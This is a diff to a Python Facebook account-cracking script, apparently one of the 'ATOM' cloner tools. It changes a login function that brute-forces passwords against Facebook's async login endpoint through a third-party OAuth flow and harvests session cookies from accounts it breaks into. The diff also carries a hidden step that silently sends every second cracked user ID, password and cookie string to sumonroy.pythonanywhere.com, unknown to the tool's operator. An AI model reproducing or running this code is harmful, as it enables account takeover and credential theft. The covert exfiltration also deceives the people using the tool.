@@ -1123,7 +1123,7 @@ def graph(uid, name, pwx, tl):
     except Exception as e:
         pass     
 
-
+#----------------------------------------------------------ncs music--------------------------------------------------------------------
 def mbasic(uid,pwx,tl):
     global oks
     global cps
@@ -1135,92 +1135,89 @@ def mbasic(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            password = pw
-            web_encryptor = Encrypt_PWD_Web()
-            web_token = web_encryptor.PWD_BROWSER(password)
-            free_fb = Session.get('https://touch.facebook.com').text
-            data = {
-            "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number": "0",
-            "unrecognized_tries": "0",
-            "email": uid,
-            "prefill_contact_point": uid,
-            "prefill_source": "browser_dropdown",
-            "prefill_type": "password",
-            "first_prefill_source": "browser_dropdown",
-            "first_prefill_type": "contact_point",
-            "had_cp_prefilled": "true",
-            "had_password_prefilled": "true",
-            "is_smart_lock": "false",
-            "bi_xrwh": "92004344361786634",
-            "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            "fb_dtsg": "NAfup2Me3JHXJFN2yxBY35qKn-1LtNpMqJhQzaJ3AqYbs8PMFOvFhGw:0:0",
-            "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "_dyn": "1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhw23E52q1ew6ywaq1Jw20Ehw73wGwcq0RE1u81x82ew5fw5NyE1582ZwrU2pw4swSw7zwde0UE",
-            "csr": "",
-            "hsdp": "",
-            "hblp": "",
-            "sjsp": "",
-            "req": "1",
-            "fmt": "1",
-            "a": "AYrzCMozrxxEkLpLMe4Y2HjtqtsmVGwYzrN5JRYYClldhdPtYgFp1Jf_aTSnrZs9GEMJRGEqpBnp7Yr7bbjZFjK5_l3XCV2rjhwTOtu5o4lWwg",
-            "_user": "0"}
+            free_fb = Session.get('https://limited.facebook.com/login.php?skip_api_login=1&api_key=822446634883149&kid_directed_site=0&app_id=822446634883149&signed_next=1&next=https://m.facebook.com/v3.3/dialog/oauth?client_id=822446634883149&redirect_uri=https://ncs.io/facebook/login-callback&scope=email&response_type=code&state=Flq6oXHGBZViXxZGu2BVRw7Htzt3P9vhLm1PkHBZ&ret=login&fbapp_pres=0&logger_id=e61eae7c-a558-4636-85f2-9929e32906b9&tp=unspecified&cancel_url=https://ncs.io/facebook/login-callback?error=access_denied&error_code=200&error_description=Permissions error&error_reason=user_denied&state=Flq6oXHGBZViXxZGu2BVRw7Htzt3P9vhLm1PkHBZ#=&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated').text
             cookies = {
-            'datr': '7DnMaEaBSi1euh0ZrTxnFPXZ',
-            'sb': '7DnMaMKotlR75LUbGLYU-TYB',
+            'datr': 'aH3WaNUkO1yuk7Po-ytjAVJc',
+            'sb': 'aX3WaDH7hAO44ftEFYsZy6Of',
             'm_pixel_ratio': '2.4749999046325684',
-            'ps_l': '1',
-            'ps_n': '1',
-            'pas': '100056503155212%3AfxOzQdbFmo',
-            'dpr': '2.4749999046325684',
             'wd': '437x973',
-            'fr': '02n8peqk75hF9D13g.AWcYnHXf1GZF8b7MXvQBW4q05cEXwaTcJhJCnUnlt93z2xfY_YY.BozDns..AAA.0.0.Bo1hLI.AWcm2HkPoopHsJCgNGiCAIgqHgw'}
-            headers = {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13; V2060 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.155 Mobile Safari/537.36",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "sec-ch-ua-platform": "\"Android\"",
-            "sec-ch-ua": "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
-            "x-response-format": "JSONStream",
-            "sec-ch-ua-mobile": "?1",
-            "x-asbd-id": "359341",
-            "x-fb-lsd": "AdEVi-OFg_s",
-            "x-requested-with": "XMLHttpRequest",
-            "origin": "https://mbasic.facebook.com",
-            "sec-fetch-site": "same-origin",
-            "sec-fetch-mode": "cors",
-            "sec-fetch-dest": "empty",
-            "referer": "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1393952984244777&kid_directed_site=0&app_id=1393952984244777&signed_next=1&next=https://m.facebook.com/v16.0/dialog/oauth?app_id=1393952984244777&cbt=1758859215730&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfedd56e5da955addb%26domain%3Dwww.boomplay.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.boomplay.com%252Ff8911011906172fa2%26relation%3Dopener&client_id=1393952984244777&display=touch&domain=www.boomplay.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.boomplay.com%2Fsongs%2F216051730&locale=en_US&logger_id=fb5ecf6aa44bb1de3&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df9bf310860cbd212d%26domain%3Dwww.boomplay.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.boomplay.com%252Ff8911011906172fa2%26relation%3Dopener%26frame%3Dfb8a321b81d3ff397&response_type=token%2Csigned_request%2Cgraph_domain&sdk=joey&version=v16.0&ret=login&fbapp_pres=0&tp=unspecified&cancel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46",
-            "accept-language": "en-US,en;q=0.9",
-            "priority": "u=1, i"}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://mbasic.facebook.com/login/device-based/login/async/?api_key=1393952984244777&auth_token=3ea524ab821dcb9e2140fbe35e5e09fd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fapp_id%3D1393952984244777%26cbt%3D1758859978311%26logger_id%3D2fb35fb5-cdb2-46af-8dc4-996548b0ec0b&refsrc=deprecated&app_id=1393952984244777&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46&lwv=100'
-            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
+            'fr': '0zyKJJK6dI3lBLjbu..Bo1n1p..AAA.0.0.Bo1n3U.AWfvqPp5N7wsM6LQ4jVHWpwo6QE',}
+            headers = {'authority':'limited.facebook.com',
+            'method': 'POST',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-encoding':'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
+            params = {
+            'api_key': '822446634883149',
+            'auth_token': '376df36ddda6d8ca677cca104504e039',
+            'skip_api_login': '1',
+            'signed_next': '1',
+            'next': 'https://limited.facebook.com/v3.3/dialog/oauth?client_id=822446634883149',
+            'refsrc': 'deprecated',
+            'app_id': '822446634883149',
+            'cancel': 'https://ncs.io/facebook/login-callback?error=access_denied',
+            'lwv': '100',}
+            data = {
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            'try_number': '0',
+            'unrecognized_tries': '0',
+            'email': uid,
+            'prefill_contact_point': uid,
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'password',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'contact_point',
+            'had_cp_prefilled': 'true',
+            'had_password_prefilled': 'true',
+            'is_smart_lock': 'false',
+            'bi_xrwh': '92004344361786634',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            'fb_dtsg': 'NAfup2Me3JHXJFN2yxBY35qKn-1LtNpMqJhQzaJ3AqYbs8PMFOvFhGw:0:0',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            '_dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhw23E52q1ew6ywaq1Jw20Ehw73wGwcq0RE1u81x82ew5fw5NyE1582ZwrU2pw4swSw7zwde0UE',
+            'csr': '',
+            'hsdp': '',
+            'hblp': '',
+            'sjsp': '',
+            'req': '1',
+            'fmt': '1',
+            'a': 'AYrzCMozrxxEkLpLMe4Y2HjtqtsmVGwYzrN5JRYYClldhdPtYgFp1Jf_aTSnrZs9GEMJRGEqpBnp7Yr7bbjZFjK5_l3XCV2rjhwTOtu5o4lWwg',
+            '_user': '0',}
+            url = "https://limited.facebook.com/login/device-based/login/async/"
+            Session.headers.update(headers)
+            for k, v in cookies.items():
+                Session.cookies.set(k, v, domain=".facebook.com")
+            resp = Session.post(url, params=params, data=data, allow_redirects=True, timeout=30)
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                print(f" {green}Cookie : {green}{coki}")
                 check = check_lock(cid)
                 if "live" in check:
-                    if "https://www.facebook.com/confirmemail.php?" in po or "confirmemail" in po:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        break
+                    bkas.append(cid)
+                    if len(bkas)% 2 == 0:
+                        statusok = (f"{cid}|{pw}|{coki}")
+                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                        print(f" {green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
                 else:
                     break
             elif 'checkpoint' in response:
@@ -1237,7 +1234,7 @@ def mbasic(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
-
+#-----------------------------------boomplay----------------------------------------------------------------------------------------
 def p(uid,pwx,tl):
     global oks
     global cps
@@ -1353,7 +1350,7 @@ def p(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
-
+#-------------------------------------------async--------------------------------------------------------------------
 def x(uid,pwx,tl):
     global oks
     global cps
